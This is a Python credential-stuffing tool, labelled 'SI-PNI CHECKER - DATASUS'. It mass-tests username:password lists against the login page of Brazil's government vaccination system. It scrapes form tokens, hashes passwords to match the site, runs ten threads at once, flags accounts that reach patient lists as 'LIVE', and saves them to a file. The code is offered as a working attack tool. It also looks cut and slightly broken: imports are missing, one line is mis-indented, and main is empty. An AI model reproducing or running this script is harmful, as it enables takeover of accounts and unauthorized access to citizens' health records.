live_count = 0
die_count = 0
other_count = 0
total_checked = 0
live_credentials = []
status_lock = threading.Lock()

def print_header():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{Fore.YELLOW}      SI-PNI CHECKER - DATASUS (VERSÃO RÁPIDA)")
    print(f"{Fore.WHITE}coded by calush")

def show_status():
    with status_lock:
        print(f"\n{Fore.GREEN}✓ Contas Válidas: {live_count}")
        print(f"{Fore.RED}✗ Contas Inválidas: {die_count}")
        print(f"{Fore.YELLOW}⚠ Outros/Erros: {other_count}")
        print(f"{Fore.CYAN}⎯ Total Verificado: {total_checked}")

            success_rate = (live_count / total_checked) * 100

def get_sha512(text):
    return hashlib.sha512(text.encode('ascii')).hexdigest()

def check_single_login(usuario, senha):
    session = requests.Session()
    session.verify = False
    
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
        }
        
        res = session.get("https://sipni.datasus.gov.br/si-pni-web/faces/inicio.jsf", headers=headers, timeout=10)
        
        if res.status_code != 200:
            return "BLOCK"
        
        soup = BeautifulSoup(res.text, 'html.parser')
        
        viewstate = "j_id1"
        viewstate_input = soup.find("input", {"name": "javax.faces.ViewState"})
        if viewstate_input and viewstate_input.get('value'):
            viewstate = viewstate_input['value']
        
        form = soup.find("form", {"id": "j_idt23"}) or soup.find("form", {"id": "j_idt26"}) or soup.find("form")
        form_id = form.get('id', 'j_idt23') if form else 'j_idt23'
        
        submit_button = form.find("input", {"type": "submit"}) or form.find("button", {"type": "submit"})
        submit_id = submit_button.get('id', '') if submit_button else ''
        
        senha_hash = get_sha512(senha)
        
        payload = {
            form_id: form_id,
            'javax.faces.ViewState': viewstate,
            f'{form_id}:usuario': usuario,
            f'{form_id}:senha': senha_hash,
            submit_id: submit_id if submit_id else f'{form_id}:j_idt32'
        }
        
        post_headers = headers.copy()
        post_headers.update({
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://sipni.datasus.gov.br',
            'Referer': 'https://sipni.datasus.gov.br/si-pni-web/faces/inicio.jsf'
        })
        
        res2 = session.post("https://sipni.datasus.gov.br/si-pni-web/faces/inicio.jsf", 
                          data=payload, headers=post_headers, timeout=10, allow_redirects=False)
        
        if res2.status_code == 302:
            location = res2.headers.get('Location', '')
            if location and 'inicio.jsf' not in location:
                return "LIVE"
        
        final_text = res2.text.lower()
        
        if 'usuário ou senha inválidos' in final_text or 'senha incorreta' in final_text:
            return "DIE"
        
        if 'pacienteform' in final_text or 'listapacientetable' in final_text:
            return "LIVE"
        
        if 'inicio.jsf' in res2.url.lower() or '<input type="password"' in final_text:
            return "DIE"
        
        return "UNKNOWN"
        
    except Exception:
        return "ERROR"

def process_account(cred, index, total):
    global live_count, die_count, other_count, total_checked, live_credentials
    
    try:
        if ':' not in cred:
            with status_lock:
                other_count += 1
                total_checked += 1
            return f"{Fore.RED}[INVALID FORMAT]", False
        
        usuario, senha = cred.split(':', 1)
        
        result = check_single_login(usuario, senha)
        
        with status_lock:
            total_checked += 1
            
            if result == "LIVE":
                live_count += 1
                live_credentials.append((usuario, senha))
                status = f"{Fore.GREEN}[LIVE]"
                return status, True
            elif result == "DIE":
                die_count += 1
                status = f"{Fore.RED}[DIE]"
                return status, False
            else:
                other_count += 1
                status = f"{Fore.YELLOW}[{result}]"
                return status, False
                
    except Exception as e:
        with status_lock:
            other_count += 1
            total_checked += 1
        return f"{Fore.YELLOW}[ERROR]", False

def test_single():
    print_header()
    print(f"{Fore.YELLOW}  Verificação Individual")
    
    usuario = input(f"\n{Fore.WHITE}[?] Usuário: ").strip()
    if not usuario:
        print(f"{Fore.RED}[!] Usuário não pode ser vazio!")
        input(f"\n{Fore.LIGHTBLACK_EX}Pressione Enter...")
        return
    
    senha = input(f"{Fore.WHITE}[?] Senha: ").strip()
    if not senha:
        print(f"{Fore.RED}[!] Senha não pode ser vazia!")
        input(f"\n{Fore.LIGHTBLACK_EX}Pressione Enter...")
        return
    
    print(f"\n{Fore.YELLOW}[~] Verificando...")
    
    start_time = time.time()
    resultado = check_single_login(usuario, senha)
    elapsed = time.time() - start_time
    
    print(f"{Fore.YELLOW}  RESULTADO ({elapsed:.2f}s)")
    
    if resultado == "LIVE":
        print(f"{Fore.GREEN}[✓] CONTA VÁLIDA")
        print(f"{Fore.WHITE}Usuário: {Fore.CYAN}{usuario}")
        print(f"{Fore.GREEN}Status: ACESSO CONCEDIDO")
    elif resultado == "DIE":
        print(f"{Fore.RED}[✗] CONTA INVÁLIDA")
        print(f"{Fore.WHITE}Usuário: {Fore.CYAN}{usuario}")
        print(f"{Fore.RED}Status: CREDENCIAIS INCORRETAS")
    else:
        print(f"{Fore.YELLOW}[!] RESULTADO: {resultado}")
    
    input(f"\n{Fore.LIGHTBLACK_EX}Pressione Enter...")

def test_multiple():
    global live_count, die_count, other_count, total_checked, live_credentials
    
    print_header()
    print(f"\n{Fore.YELLOW}  Verificação em Lote")
    
    print(f"\n{Fore.WHITE}Formato: usuario:senha")
    print(f"{Fore.LIGHTBLACK_EX}Exemplo:")
    print(f"{Fore.LIGHTBLACK_EX}  user1:pass123")
    print(f"{Fore.LIGHTBLACK_EX}  user2:pass456")
    
    file_path = input(f"\n{Fore.YELLOW}[?] Arquivo: {Fore.WHITE}").strip()
    
    if not file_path:
        print(f"{Fore.RED}[!] Nenhum arquivo!")
        input(f"\n{Fore.LIGHTBLACK_EX}Pressione Enter...")
        return
    
    if not os.path.exists(file_path):
        print(f"{Fore.RED}[!] Arquivo não encontrado!")
        input(f"\n{Fore.LIGHTBLACK_EX}Pressione Enter...")
        return
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            credentials = [line.strip() for line in f if line.strip() and ':' in line]
    except Exception as e:
        print(f"{Fore.RED}[!] Erro: {e}")
        input(f"\n{Fore.LIGHTBLACK_EX}Pressione Enter...")
        return
    
    if not credentials:
        print(f"{Fore.RED}[!] Nenhuma credencial!")
        input(f"\n{Fore.LIGHTBLACK_EX}Pressione Enter...")
        return
    
    print(f"\n{Fore.GREEN}[+] {len(credentials)} credenciais carregadas")
    print(f"{Fore.YELLOW}[~] Iniciando verificação...")
    
    live_count = 0
    die_count = 0
    other_count = 0
    total_checked = 0
    live_credentials = []
    
    max_workers = min(10, len(credentials))
    
    start_time = time.time()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for i, cred in enumerate(credentials, 1):
            future = executor.submit(process_account, cred, i, len(credentials))
            futures.append((i, cred, future))
        
        for i, cred, future in futures:
            try:
                usuario = cred.split(':', 1)[0] if ':' in cred else cred
                status, _ = future.result(timeout=15)
                print(f"{Fore.CYAN}[{i:03d}/{len(credentials):03d}] {usuario:<30} {status}")
                
                if i % 10 == 0 or i == len(credentials):
                    show_status()
                    
            except concurrent.futures.TimeoutError:
                print(f"{Fore.CYAN}[{i:03d}/{len(credentials):03d}] {usuario:<30} {Fore.YELLOW}[TIMEOUT]")
                with status_lock:
                    other_count += 1
                    total_checked += 1
            except Exception:
                print(f"{Fore.CYAN}[{i:03d}/{len(credentials):03d}] {usuario:<30} {Fore.YELLOW}[ERROR]")
                with status_lock:
                    other_count += 1
                    total_checked += 1
    
    elapsed = time.time() - start_time
    
    print(f"\n{Fore.YELLOW}[+] VERIFICAÇÃO CONCLUÍDA ({elapsed:.2f}s)")
    show_status()
    
    if live_count > 0:
        try:
            save_dir = '/sdcard/chk/datasus/'
            if not os.path.exists(save_dir):
                os.makedirs(save_dir, exist_ok=True)
            
            save_file = os.path.join(save_dir, 'on.txt')
            with open(save_file, 'w', encoding='utf-8') as f:
                for usuario, senha in live_credentials:
                    f.write(f"{usuario}:{senha}\n")
            print(f"\n{Fore.GREEN}[+] {live_count} contas salvas em: {save_file}")
        except:
            save_file = 'on.txt'
            with open(save_file, 'w', encoding='utf-8') as f:
                for usuario, senha in live_credentials:
                    f.write(f"{usuario}:{senha}\n")
            print(f"\n{Fore.YELLOW}[+] {live_count} contas salvas em: {save_file}")
    
    input(f"\n{Fore.LIGHTBLACK_EX}Pressione Enter...")

def main():
    while True:
